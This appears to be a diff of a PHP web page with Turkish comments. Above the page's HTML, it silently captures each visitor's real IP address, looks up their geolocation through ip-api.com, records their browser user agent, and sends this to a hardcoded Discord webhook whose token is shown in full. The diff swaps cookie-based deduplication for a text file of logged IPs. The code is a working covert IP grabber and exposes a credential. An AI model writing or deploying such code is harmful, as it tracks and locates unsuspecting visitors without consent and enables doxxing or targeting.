@@ -1,19 +1,25 @@
 <?php
 // ---- KONFİG ----
 $webhook = "https://discord.com/api/webhooks/1518189732692103198/bsr3VNCIFgM-yQbOekAfBjYJ5acWdrmmrhnXNHRjko93yJ0bicj9Vzg9GC0d4Y8KwZ8A";
-$cookie_name = "ziyaret_edildi";
+$log_dosyasi = "ziyaretciler.txt"; // Kaydedilen IP'lerin tutulacağı dosya
 
-// Eğer daha önce ziyaret ettiyse, tekrar mesaj gönderme
-if (!isset($_COOKIE[$cookie_name])) {
-    // ---- Gerçek IP'yi Al ----
-    if (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) {
-        $ip = $_SERVER['HTTP_CF_CONNECTING_IP'];
-    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
-        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
-    } else {
-        $ip = $_SERVER['REMOTE_ADDR'];
-    }
+// ---- Gerçek IP'yi Al ----
+if (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) {
+    $ip = $_SERVER['HTTP_CF_CONNECTING_IP'];
+} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
+} else {
+    $ip = $_SERVER['REMOTE_ADDR'];
+}
 
+// ---- IP Daha Önce Kaydedilmiş mi Kontrol Et ----
+$kayitli_ips = [];
+if (file_exists($log_dosyasi)) {
+    $kayitli_ips = file($log_dosyasi, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
+}
+
+// Eğer IP kayıtlı değilse, bildirim gönder ve kaydet
+if (!in_array($ip, $kayitli_ips)) {
     // ---- Konum Bilgilerini Al ----
     $konum = json_decode(@file_get_contents("http://ip-api.com/json/{$ip}"), true);
     $user_agent = $_SERVER['HTTP_USER_AGENT'];
@@ -38,8 +44,8 @@ if (!isset($_COOKIE[$cookie_name])) {
     curl_exec($ch);
     curl_close($ch);
 
-    // ---- Çerez ayarla (1 gün boyunca hatırla) ----
-    setcookie($cookie_name, "geldi", time() + 86400, "/");
+    // ---- IP'yi Dosyaya Kaydet ----
+    file_put_contents($log_dosyasi, $ip . PHP_EOL, FILE_APPEND | LOCK_EX);
 }
 ?>
 <!DOCTYPE html>
